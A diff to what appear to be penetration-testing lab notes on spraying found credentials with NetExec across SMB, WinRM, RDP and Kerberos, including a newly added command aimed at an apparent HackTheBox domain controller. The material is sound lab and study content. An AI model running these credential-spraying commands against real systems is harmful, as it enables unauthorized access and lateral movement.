@@ -3,7 +3,6 @@ Once credentials or many credentials are found we'll have to utilize them to spr
 
 - Create wordlist of all domain users.
 - Create wordlist of all retrieved passwords/hashes.
-
 ##### nxc spraying domain users
 
 ```
@@ -14,6 +13,12 @@ Saved the nxc output into an users.txt file and ran the following command:
 
 ```
 grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
+```
+
+Kerberos Auth
+
+```
+nxc smb frizzdc.frizz.htb -u users.txt -p passwords.txt -k --continue-on-success
 ```
 ##### nxc spraying local users
 
@@ -66,12 +71,11 @@ nxc smb 172.16.125.10-14 172.16.125.82-83 192.168.125.120-122 -u users.txt -p pa
 nxc winrm 172.16.125.10-14 172.16.125.82-83 192.168.125.120-122 -u users.txt -p passwords.txt --continue-on-success
 ```
 
-3. rdp
+3. RDP
 
 ```
 nxc rdp 172.16.125.10-14 172.16.125.82-83 192.168.125.120-122 -u users.txt -p passwords.txt --continue-on-success
 ```
-
 ##### Using nxc to enumerate users descriptions & if users are local or domain users
 
 This will enumerate the description, which could hide an password.
